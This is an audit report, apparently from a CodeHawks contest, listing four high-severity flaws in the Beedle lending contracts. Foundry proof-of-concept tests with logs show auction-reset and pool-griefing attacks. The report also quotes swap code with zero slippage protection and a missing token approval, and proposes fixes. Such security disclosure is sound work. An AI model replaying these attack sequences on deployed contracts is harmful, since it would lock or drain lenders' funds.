# [Beedle Report](https://www.codehawks.com/report/clkbo1fa20009jr08nyyf9wbx)

## Findings by Dimulski
| Severity | Title | 
|:--:|:---|
| [H-01](#H-01) | Griefe seizeLoan and buyLoan | 
| [H-02](#H-02) | Grief pool lenders | 
| [H-03](#H-03) | No slippage protection | 
| [H-04](#H-04) | Funds will be locked forever | 

## <a id='H-01'></a>[H-01] Griefe seizeLoan and buyLoan             

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L591-L710

## Summary
In Lender.sol seizeLoan and buyLoan can be griefed by a malicious actor. The lender can only receive the collateral of the loan taken by the malicious actor if he call repay himself and pays the debt of the loan. 

## Vulnerability Details
In Lender.sol seizeLoan and buyLoan can be griefed by a malicious actor. The lender can only receive the collateral of the loan taken by the malicious actor if he call repay himself and pays the debt of the loan. Once a startAuction is called on a loan, malicious actor can call refinance with the same parameters with which he called borrow, thus paying only gas and resetting the loan.auctionStartTimestamp == type(uint256).max.

```
function test_GreifStartAuction() public {
        vm.startPrank(lender1);
        Pool memory p = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);
        (, , , , uint256 poolBalance, , , , ) = lender.pools(poolId);
        assertEq(poolBalance, 1000 * 10 ** 18);

        vm.startPrank(borrower);
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 100 * 10 ** 18,
            collateral: 200 * 10 ** 18
        });

        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);
        (, , , , , , , , uint256 notStarted, ) = lender.loans(0);
        console.log(
            "Auction time of the loan when it is not started: ",
            notStarted
        );

        vm.startPrank(lender1);
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;

        lender.startAuction(loanIds);

        (, , , , , , , , uint256 auctionStarted, ) = lender.loans(0);
        console.log(
            "Auction time of the loan when auction is started: ",
            auctionStarted
        );

        vm.startPrank(borrower);
        Refinance memory r = Refinance({
            loanId: 0,
            poolId: poolId,
            debt: 100 * 10 ** 18,
            collateral: 200 * 10 ** 18
        });
        Refinance[] memory rs = new Refinance[](1);
        rs[0] = r;

        lender.refinance(rs);

        (, , , , , , , , uint256 afterRefinance, ) = lender.loans(0);
        console.log(
            "Auction time of the loan after refinance is called: ",
            afterRefinance
        );
    }
```

These are the logs: 

```
Logs:
  Auction time of the loan when it is not started:  115792089237316195423570985008687907853269984665640564039457584007913129639935
  Auction time of the loan when auction is started:  1
  Auction time of the loan after refinance is called:  115792089237316195423570985008687907853269984665640564039457584007913129639935
```
## Impact
The lender can only receive the collateral of the loan taken by the malicious actor if he call repay himself and pays the debt of the loan. 

## Tools Used
Manual Review

## Recommendations
In refinance check that the auction is not already started

```
if (loan.auctionStartTimestamp != type(uint256).max)
                revert AuctionStarted();
```
## <a id='H-02'></a>H-02. Grief pool lenders            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465-L534

## Summary
The buyLoan function allows everybody who has a loan with a started auction to grief a pool set by some lender. The loan collateral and loan tokens are not required to be the same as the collateral and loan tokens of the pool. The whole pool balance can be locked away forever for almost no cost to the attacker. 

## Vulnerability Details

The buyLoan function allows everybody who has a loan with a started auction to grief a pool set by some lender. The loan collateral and loan tokens are not required to be the same as the collateral and loan tokens of the pool. The whole pool balance can be locked away forever for almost no cost to the attacker. The pool lender will lose all of his loan tokens supplied to the Lender contract, and won't be able to withdraw the collateral as their is another griefing attack. Loans can't be bought or seized, as the malicious borrower can always call refinance with the same parameters of his borrow, and thus only pay gas and reset the loan.auctionStartTimestamp == type(uint256).max (this is another vulnerability as the root of the issue is different). If the pool lender offers ETH for BTC the looses will be big, as there is no whitelist mechanism so an attacker can just deploy two ERC20 contracts, mint however tokens he wants to himself, set up a pool, borrow from his own pool, and then call buyLoan and give the loan to the pool lender he wants to grief. The loan.debt will be substracted from the pool.poolBalance of the pool he wants to grief.

```
function test_griefPool() public {
        vm.startPrank(lender1);
        Pool memory p = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);
        (, , , , uint256 poolBalance, , , , ) = lender.pools(poolId);
        assertEq(poolBalance, 1000 * 10 ** 18);

        vm.startPrank(lender2);
        Pool memory pAttack = Pool({
            lender: lender2,
            loanToken: address(loanTokenAttack),
            collateralToken: address(collateralTokenAttack),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolIdAttack = lender.setPool(pAttack);
        (, , , , uint256 poolAttackBalance, , , , ) = lender.pools(
            poolIdAttack
        );
        assertEq(poolAttackBalance, 1000 * 10 ** 18);

        vm.startPrank(borrower);
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 100 * 10 ** 18,
            collateral: 200 * 10 ** 18
        });

        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);

        (, , , , uint256 borrow, , , , ) = lender.pools(poolId);
        (, , , , uint256 borrowAttack, , , , ) = lender.pools(poolIdAttack);
        console.log("pool balance after borrow: ", borrow);
        console.log("poolAttack balance after borrow: ", borrowAttack);

        vm.startPrank(lender1);

        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;

        lender.startAuction(loanIds);
        skip(7200);
        (, , , , , , , , uint256 startTime, ) = lender.loans(0);
        console.log("the start time of the auction: ", startTime);

        lender.buyLoan(0, poolIdAttack);
        (, , , , uint256 buyLoan, , , , ) = lender.pools(poolId);
        (, , , , uint256 buyLoanAttack, , , , ) = lender.pools(poolIdAttack);
        console.log("pool balance after buy loan: ", buyLoan);
        console.log("poolAttack balance after buy loan: ", buyLoanAttack);
    }
```

Those are the outputs 

```
Logs:
  pool balance after borrow:  900000000000000000000
  poolAttack balance after borrow:  1000000000000000000000
  the start time of the auction:  1
  pool balance after buy loan:  1000002054794520547945
  poolAttack balance after buy loan:  899997716894977168950
```
With exact calculations almost all of the attacked pool loan tokens can be locked. 

## Impact
All of the supplied loan tokens of the pool lender will be locked as the loan.debt will be substracted from pool.poolBalance, due to the fact that the attacker didn't deposit any collateral required by the pool, the lender won't be able to withdraw any collateral. 

## Tools Used
Manual Review

## Recommendations
In the buyLoan function check that the function is being called by the pool lender, and check if the loan and collateral tokens of the loan match with the ones in the pool.
## <a id='H-03'></a>H-03. No slippage protection            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol

## Summary
In the Fees.sol contract there is no slippage protection in the swapping function which can result in the protocol receiving fewer tokens than at a fair market price, if a sandwich attack is performed.

## Vulnerability Details
In the Fees.sol contract there is no slippage protection in the swapping function which can result in the protocol receiving fewer tokens than at a fair market price, if a sandwich attack is performed. A Sandwich attack is when a bot places a buy order in front of a user’s transaction and a sell order directly after the user’s transaction. So, The user’s order is executed at a higher price and the bot then immediately sells into this price.

```
function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0, // @audit min return 0 tokens; no slippage => user loss of funds
                sqrtPriceLimitX96: 0
            });

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
```
I have set the severity of this vulnerability as high, as the Fees.sol contract will be used to swap all of the ERC20 tokens received as fees from the Lender.sol protocol to WETH (otherwise there is no purpose for this contract, and yet the contract itself is vulnerable). Which results in the protocol using funds, not a user of the protocol. This is a different issue than my other issue describing how because the Uniswap V3 router is not approved to spend any ERC20 tokens, thus tokens will be locked forever, as the root of the vulnerability is different - ``amountOutMinimum: 0, // @audit min return 0 tokens; no slippage => user loss of funds``.

## Impact
Swaps can happen at a bad price and lead to receiving fewer tokens than at a fair market price. The attacker's profit is the protocol's loss.

## Tools Used
Manual Review

## Recommendations
Per Uniswap docs ``amountOutMinimum: For a real deployment, this value should be calculated using our SDK or an onchain price oracle - this helps protect against getting an unusually bad price for a trade due to a front running sandwich or another type of price manipulation``.
## <a id='H-04'></a>H-04. Funds will be locked forever            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol

## Summary
Fees.sol is the contract that the Lender.sol contract sends the fees it earns. All ERC20 tokens in the Fees.sol contract will be locked forever, because the Uniswap V3 router is not approved to spend any tokens, and thus a swap cannot be performed, and ERC20 tokens can't be transferred out of the contract.

## Vulnerability Details
Fees.sol is the contract that the Lender.sol contract sends the fees it earns (otherwise there is no purpose for this contract, and yet the contract itself is vulnerable). It has one function sellProfits, which intends to swap ERC20 tokens to WETH. Although the swap itself is vulnerable to slippage attacks, this is a separate issue, as the issue described in this submission results in locking forever all ERC20 tokens send to Fees.sol. As per Uniswap documentation: ``The caller must approve the contract to withdraw the tokens from the calling address's account to execute a swap.`` https://docs.uniswap.org/contracts/v3/guides/swaps/single-swaps Nowhere in the Fees.sol the Uniswap V3 router is approved to spend any ERC20 tokens. The only way tokens are send to another address is trough the sellProfits function:
```
function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
``` 
Since this function will always revert the tokens can't be transferred from the Fees.sol contract.

In the Lender.sol contract there is a function that allows the Fees contract to be changed to a newer one:
```
function setFeeReceiver(address _feeReceiver) external onlyOwner {
        feeReceiver = _feeReceiver;
    }
``` 
This vulnerability can be mitigated in a newer version of the contract, but the funds that were already send to the Fees.sol contract will be lost forever. This is why I have classified this vulnerability as high.
 

## Impact
Funds will be locked forever, and thus lost.

## Tools Used
Manual review

## Recommendations
Implement an approve function, which approves the Uniswap V3 Router contract to transfer the desired ERC20 token. Or approve the Uniswap V3 router to transfer '_profits' token in the sellProfits function.
		





